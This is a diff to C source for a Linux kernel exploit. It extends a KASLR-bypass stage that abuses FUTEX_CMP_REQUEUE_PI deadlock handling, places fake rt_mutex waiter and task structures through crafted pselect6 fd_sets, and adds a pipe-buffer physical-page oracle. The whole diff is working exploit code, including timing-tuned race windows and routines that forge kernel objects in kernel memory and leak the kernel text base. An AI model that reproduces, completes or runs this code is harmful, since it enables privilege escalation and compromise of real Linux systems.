@@ -3,14 +3,14 @@
 #ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
 #endif
-#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
 #define SLIDE_PSELECT_WORD_SHIFT 0
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
 
-#ifdef SLIDE_P0_OFFSET_CANDIDATES
+#if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
+    (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE)
 static const uintptr_t slide_p0_offsets[] = {
   SLIDE_P0_OFFSET_CANDIDATES
 };
@@ -36,6 +36,28 @@ static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
+static atomic_int slide_consumer_ready;
+static atomic_int slide_pselect_write_window;
+static int slide_pselect_nfds = PSELECT_ROUTE_NFDS;
+static int slide_syscall_pad;
+
+static int slide_commit_stext(uint64_t stext, const char *source);
+
+static useconds_t slide_enter_delay_usec(void) {
+  const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
+  if (!forced || !*forced) {
+    forced = getenv("PSELECT_DELAY_USEC");
+  }
+  if (forced && *forced) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(forced, &end, 0);
+    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
+      return (useconds_t)value;
+    }
+  }
+  return PSELECT_ENTER_DELAY_USEC;
+}
 
 static uint64_t slide_fdset_get_word(const fd_set *set, int word) {
   uint64_t value = 0;
@@ -57,7 +79,7 @@ static void slide_log_child_context(void) {
 
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
-  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
+  return (slide_pselect_nfds + bits_per_word - 1) / bits_per_word;
 }
 
 int slide_pselect_global_word(int waiter_word) {
@@ -119,7 +141,7 @@ void slide_pselect_put_waiter_word(
     pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
                "words_per_set=%d nfds=%d\n",
                name, waiter_word, global_word, words_per_set,
-               SLIDE_PSELECT_NFDS);
+               slide_pselect_nfds);
   }
 }
 
@@ -134,6 +156,15 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     uint64_t value;
     const char *name;
   } words[] = {
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    {0, slide_oracle_parent, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, slide_oracle_target, "tree_left"},
+    {3, FAKE_WAITER_PRIO, "tree_prio"},
+    {5, slide_oracle_parent, "pi0"},
+    {6, 0, "pi1"},
+    {7, slide_oracle_target, "pi2"},
+#else
     {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
     {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
@@ -141,6 +172,7 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {5, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi0"},
     {6, 0, "pi1"},
     {7, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi2"},
+#endif
     {8, FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
@@ -164,13 +196,11 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 }
 
 void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
-  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
+  for (int fd = 0; fd < slide_pselect_nfds; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
       dup2(read_fd, fd);
     }
   }
-  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
-  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
 }
 
 void slide_pselect_stack_copy(void) {
@@ -188,7 +218,7 @@ void slide_pselect_stack_copy(void) {
                errno);
     block_fd = pipefd[0];
   }
-  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
+  int high_read = fcntl(block_fd, F_DUPFD, slide_pselect_nfds + 16);
   if (high_read < 0) {
     pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
     if (block_fd != pipefd[0]) {
@@ -214,26 +244,56 @@ void slide_pselect_stack_copy(void) {
   atomic_store(&slide_consume_sched_ok, 0);
   atomic_store(&slide_consume_last_sched_ret, -1);
   atomic_store(&slide_consume_last_sched_errno, 0);
+  atomic_store(&slide_pselect_write_window, 0);
 
   struct timespec timeout = {
+#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
+    .tv_sec = 0,
+    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
+#else
     .tv_sec = PSELECT_TIMEOUT_SEC,
     .tv_nsec = 0,
+#endif
   };
   struct timespec *timeoutp = &timeout;
 
+  size_t pselect_started = gettime_ns();
+  for (int index = 0; index < slide_syscall_pad; index++) {
+    syscall(SYS_gettid);
+  }
   atomic_store(&slide_consume_go, 1);
   errno = 0;
-  int ret = (int)syscall(SYS_pselect6, SLIDE_PSELECT_NFDS,
+  int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+  size_t pselect_elapsed_usec =
+      (gettime_ns() - pselect_started) / 1000ULL;
   atomic_store(&slide_consume_go, 0);
 
-  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
+  if (atomic_load(&slide_consume_enter_sched) != 0 &&
+      !atomic_load(&slide_consume_stop)) {
+    size_t consume_deadline = gettime_ns() + 200000000ULL;
+    while (!atomic_load(&slide_consume_stop) &&
+           gettime_ns() < consume_deadline) {
+      usleep(1000);
+    }
+  }
+
+  pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
+          "elapsed_usec=%zu "
+          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
           "last_sched_ret=%d last_sched_errno=%d\n",
-          ret, saved_errno, atomic_load(&slide_consume_calls),
+          slide_pselect_nfds, slide_syscall_pad, ret, saved_errno,
+          pselect_elapsed_usec,
+          atomic_load(&slide_consumer_ready),
+          atomic_load(&slide_consume_seen),
+          atomic_load(&slide_consume_enter_sched),
+          atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
+  atomic_store(&slide_pselect_write_window,
+               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -246,6 +306,7 @@ void slide_pselect_stack_copy(void) {
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
+  atomic_store(&slide_consumer_ready, 1);
   int *errno_ptr = &errno;
 
   int seen = 0;
@@ -268,7 +329,7 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     }
 
     if (seq == 1) {
-      usleep(PSELECT_ENTER_DELAY_USEC);
+      usleep(slide_enter_delay_usec());
     }
 
     int tid = atomic_load(&slide_waiter_tid);
@@ -445,7 +506,8 @@ uint64_t slide_child_leak_stext(void) {
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
   while (!atomic_load(&slide_waiter_waiting) ||
-         !atomic_load(&slide_owner_started)) {
+         !atomic_load(&slide_owner_started) ||
+         !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
   }
 
@@ -473,7 +535,7 @@ uint64_t slide_child_leak_stext(void) {
   atomic_store(&slide_deadlock_seen, 1);
 
   while (!atomic_load(&slide_route_done)) {
-    sleep(1);
+    usleep(1000);
   }
   if (!atomic_load(&slide_waiter_ok)) {
     return 0;
@@ -481,6 +543,294 @@ uint64_t slide_child_leak_stext(void) {
 
   return slide_read_stext();
 }
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+static int slide_child_trigger_write(void) {
+  pthread_t waiter;
+  pthread_t owner;
+  pthread_t consumer;
+  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
+  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
+  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
+
+  while (!atomic_load(&slide_waiter_waiting) ||
+         !atomic_load(&slide_owner_started) ||
+         !atomic_load(&slide_consumer_ready)) {
+    usleep(1000);
+  }
+
+  long requeue_ret = 0;
+  int requeue_errno = 0;
+  int requeue_polls = 0;
+  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
+    requeue_polls++;
+    errno = 0;
+    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                           &slide_f_pi_target, 0);
+    requeue_errno = errno;
+    if (requeue_ret != 0) {
+      break;
+    }
+    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
+      usleep(SLIDE_REQUEUE_POLL_USEC);
+    }
+  }
+  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
+    return 0;
+  }
+  atomic_store(&slide_deadlock_seen, 1);
+  while (!atomic_load(&slide_route_done)) {
+    usleep(1000);
+  }
+  return atomic_load(&slide_waiter_ok) != 0 &&
+         atomic_load(&slide_pselect_write_window) != 0;
+}
+
+static int slide_trigger_physical_state(void) {
+  pid_t child = SYSCHK(fork());
+  if (child == 0) {
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1) {
+      _exit(1);
+    }
+    disable_rseq_for_thread();
+    slide_log_child_context();
+    _exit(slide_child_trigger_write() ? 0 : 1);
+  }
+  int status = 0;
+  SYSCHK(waitpid(child, &status, 0));
+  int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
+  pr_info("p0 physical write status=%d ok=%d\n", status, ok);
+  return ok;
+}
+
+static int slide_trigger_physical_slot(size_t slot) {
+  if (!select_slide_payload_index(slot)) {
+    return 0;
+  }
+  char delay_arg[16];
+  int delay = (int)slide_enter_delay_usec();
+  slide_pselect_nfds = PSELECT_ROUTE_NFDS;
+  slide_syscall_pad = 0;
+  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
+  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
+  if (slide_trigger_physical_state()) {
+    pr_info("p0 physical slot=%zu write attempt=1/1 delay=%d nfds=%d "
+            "pad=%d\n",
+            slot, delay, slide_pselect_nfds, slide_syscall_pad);
+    return 1;
+  }
+  pr_error("p0 physical slot=%zu write window failed after one attempt\n",
+           slot);
+  return 0;
+}
+
+static int slide_restore_physical_oracle(void) {
+  int gate_restored =
+      slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
+  int probe_restored =
+      slide_trigger_physical_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
+  pr_info("p0 physical restore triggers gate=%d probe=%d "
+          "gate_page=%016zx probe_page=%016zx\n",
+          gate_restored, probe_restored,
+          p0_gate_page_struct, p0_probe_page_struct);
+  return gate_restored && probe_restored;
+}
+
+int app_trigger_fops_slide_route(void) {
+  static size_t delay_index;
+  static const int delays[] = {
+    70000, 60000, 80000, 40000, 90000, 50000,
+    30000, 20000, 75000, 65000, 85000, 55000,
+  };
+  if (!select_slide_payload_index(0)) {
+    return 0;
+  }
+  int delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
+  delay_index++;
+  char delay_arg[16];
+  snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
+  SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
+  pr_info("app fops slide route parent=%016zx target=%016zx lock=%016zx "
+          "delay=%d\n",
+          slide_oracle_parent, slide_oracle_target, fake_lock, delay);
+  return slide_trigger_physical_state();
+}
+
+static int slide_leak_physical_base(void) {
+  size_t started = gettime_ns();
+  if (!prepare_p0_pipe_oracle()) {
+    pr_error("p0 physical pipe preparation failed\n");
+    return 0;
+  }
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!page_base) {
+    return 0;
+  }
+  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+    pr_error("p0 physical pipe gate trigger failed\n");
+    return 0;
+  }
+  int gate_result = verify_p0_pipe_oracle_gate();
+  if (getenv("P0_ORACLE_GATE_DIAG")) {
+    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+    if (gate_result != 0) {
+      slide_restore_physical_oracle();
+    }
+    return 0;
+  }
+  if (gate_result == 0) {
+    pr_warning("p0 physical pipe reclaim miss\n");
+    return 0;
+  }
+  app_publish_p0_dirty();
+  if (gate_result < 0) {
+    pr_error("p0 physical pipe gate changed unexpected pages\n");
+    slide_restore_physical_oracle();
+    return 0;
+  }
+  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+    slide_restore_physical_oracle();
+    return 0;
+  }
+  uintptr_t offset = scan_p0_pipe_oracle();
+  if (offset == (uintptr_t)-1) {
+    slide_restore_physical_oracle();
+    return 0;
+  }
+  if (!slide_restore_physical_oracle()) {
+    return 0;
+  }
+  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+  pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
+  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+}
+
+static void dump_p0_oracle_words(int fd, const char *phase,
+                                 uintptr_t address, size_t count) {
+  for (size_t index = 0; index < count; index++) {
+    uintptr_t current = address + index * sizeof(uint64_t);
+    uint64_t value = kernel_read64(fd, current);
+    pr_info("p0 diagnostic %s addr=%016zx value=%016llx\n",
+            phase, current, (unsigned long long)value);
+  }
+}
+
+static int p0_diag_write32(int fd, uintptr_t address, uint32_t value) {
+  return kernel_write_data(fd, address, &value, sizeof(value)) ==
+         (ssize_t)sizeof(value);
+}
+
+static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
+  return kernel_write_data(fd, address, &value, sizeof(value)) ==
+         (ssize_t)sizeof(value);
+}
+
+static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
+  uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
+  uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
+  uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
+  uintptr_t parent = direct_to_page(payload_base);
+  uintptr_t target = pipebuf_page_base +
+                     P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+  static const char marker[] = "RMG-P0-ORACLE-GATE";
+  uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
+  if (getenv("P0_ORACLE_READ_DIAG")) {
+    marker_address = payload_base;
+  }
+
+  if (kernel_write_data(fd, marker_address, marker, sizeof(marker) - 1) !=
+          (ssize_t)(sizeof(marker) - 1) ||
+      !p0_diag_write32(fd, lock + 0x00, 0) ||
+      !p0_diag_write64(fd, lock + 0x08, waiter) ||
+      !p0_diag_write64(fd, lock + 0x10, waiter) ||
+      !p0_diag_write64(fd, lock + 0x18, SLIDE_LOCK_OWNER_VALUE) ||
+      !p0_diag_write64(fd, waiter + 0x00, 1) ||
+      !p0_diag_write64(fd, waiter + 0x08, 0) ||
+      !p0_diag_write64(fd, waiter + 0x10, 0) ||
+      !p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
+                       SLIDE_FAKE_WAITER_PRIO) ||
+      !p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) ||
+      !p0_diag_write64(fd,
+                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+                       parent) ||
+      !p0_diag_write64(fd,
+                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0) ||
+      !p0_diag_write64(fd,
+                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
+                       target) ||
+      !p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
+                       SLIDE_FAKE_WAITER_PRIO) ||
+      !p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) ||
+      !p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) ||
+      !p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) ||
+      !p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) ||
+      !p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0) ||
+      !p0_diag_write32(fd, task + FAKE_TASK_USAGE_OFF, 0x100) ||
+      !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
+      !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
+                       FAKE_TASK_PRIO) ||
+      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
+      !p0_diag_write32(fd, task + FAKE_TASK_PI_LOCK_OFF, 0) ||
+      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF,
+                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
+      !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
+      !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, task) ||
+      !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0)) {
+    return 0;
+  }
+
+  fake_task = task;
+  fake_lock = lock;
+  fake_w0 = waiter;
+  slide_oracle_parent = parent;
+  slide_oracle_target = target;
+  return 1;
+}
+
+int run_p0_pipe_oracle_diagnostic(int fd) {
+  uintptr_t fops_page_base = page_base;
+  if (!prepare_p0_pipe_oracle() ||
+      !prepare_p0_diag_gate_payload(fd, fops_page_base)) {
+    pr_error("p0 diagnostic preparation failed pipe=%016zx fops=%016zx\n",
+             pipebuf_page_base, fops_page_base);
+    return 0;
+  }
+
+  uintptr_t target_start = slide_oracle_target - 0x20;
+  uintptr_t parent_start = slide_oracle_parent;
+  uint64_t original_target = kernel_read64(fd, slide_oracle_target);
+  pr_info("p0 diagnostic prepared pipe=%016zx source=%016zx parent=%016zx "
+          "target=%016zx original=%016llx\n",
+          pipebuf_page_base, fops_page_base, slide_oracle_parent,
+          slide_oracle_target, (unsigned long long)original_target);
+  dump_p0_oracle_words(fd, "target-before", target_start, 20);
+  dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
+  if (!slide_trigger_physical_state()) {
+    pr_error("p0 diagnostic gate trigger failed\n");
+    return 0;
+  }
+  dump_p0_oracle_words(fd, "target-after", target_start, 20);
+  dump_p0_oracle_words(fd, "parent-after", parent_start, 8);
+  uint64_t changed_target = kernel_read64(fd, slide_oracle_target);
+  if (getenv("P0_ORACLE_READ_DIAG")) {
+    int gate_ok = verify_p0_pipe_oracle_gate();
+    pr_info("p0 diagnostic pipe read gate=%d\n", gate_ok);
+    fflush(NULL);
+    for (;;) {
+      sleep(60);
+    }
+  }
+  int restore_ok = p0_diag_write64(fd, slide_oracle_target, original_target);
+  uint64_t restored_target = kernel_read64(fd, slide_oracle_target);
+  pr_info("p0 diagnostic gate complete expected=%016zx changed=%016llx "
+          "restore=%d restored=%016llx\n",
+          slide_oracle_parent, (unsigned long long)changed_target,
+          restore_ok, (unsigned long long)restored_target);
+  return restore_ok && restored_target == original_target;
+}
+#endif
 
 static int slide_commit_stext(uint64_t stext, const char *source) {
   if (stext < KIMAGE_TEXT_BASE) {
@@ -511,6 +861,39 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
 }
 
 int slide_leak_kernel_base(void) {
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
+  if (forced_offset_arg && *forced_offset_arg) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
+    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
+        (value & 0xffffULL) != 0) {
+      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
+      return 0;
+    }
+    const char *gate_page_arg = getenv("P0_GATE_PAGE_STRUCT");
+    const char *probe_page_arg = getenv("P0_PROBE_PAGE_STRUCT");
+    if (gate_page_arg && probe_page_arg) {
+      char *gate_end = NULL;
+      char *probe_end = NULL;
+      errno = 0;
+      p0_gate_page_struct = (uintptr_t)strtoull(
+          gate_page_arg, &gate_end, 0);
+      p0_probe_page_struct = (uintptr_t)strtoull(
+          probe_page_arg, &probe_end, 0);
+      if (errno || gate_end == gate_page_arg || *gate_end ||
+          probe_end == probe_page_arg || *probe_end) {
+        pr_error("slide invalid p0 restore pages gate=%s probe=%s\n",
+                 gate_page_arg, probe_page_arg);
+        return 0;
+      }
+    }
+    pr_info("slide forced p0 offset=%08llx\n", value);
+    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+  }
+  return slide_leak_physical_base();
+#else
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   uintptr_t forced_offset = 0;
   int forced = forced_offset_arg && *forced_offset_arg;
@@ -525,6 +908,8 @@ int slide_leak_kernel_base(void) {
     }
     forced_offset = (uintptr_t)value;
     pr_info("slide forced p0 offset=%08zx\n", forced_offset);
+    return slide_commit_stext(
+        KIMAGE_TEXT_BASE + forced_offset, "forced");
   }
 
   uint64_t existing_stext = slide_read_stext();
@@ -533,6 +918,13 @@ int slide_leak_kernel_base(void) {
   }
 
   int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES)
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!page_base) {
+    return 0;
+  }
+#endif
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     if (forced) {
       slide_p0_offset = forced_offset;
@@ -550,10 +942,19 @@ int slide_leak_kernel_base(void) {
             attempt, max_attempts, slide_p0_offset,
             (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
             (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset));
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES)
+    if (!select_slide_payload_slot(slide_p0_offset)) {
+      pr_error("slide payload slot missing p0_offset=%08zx\n",
+               slide_p0_offset);
+      return 0;
+    }
+#else
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
       continue;
     }
+#endif
 
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
@@ -599,4 +1000,5 @@ int slide_leak_kernel_base(void) {
   }
 
   return 0;
+#endif
 }
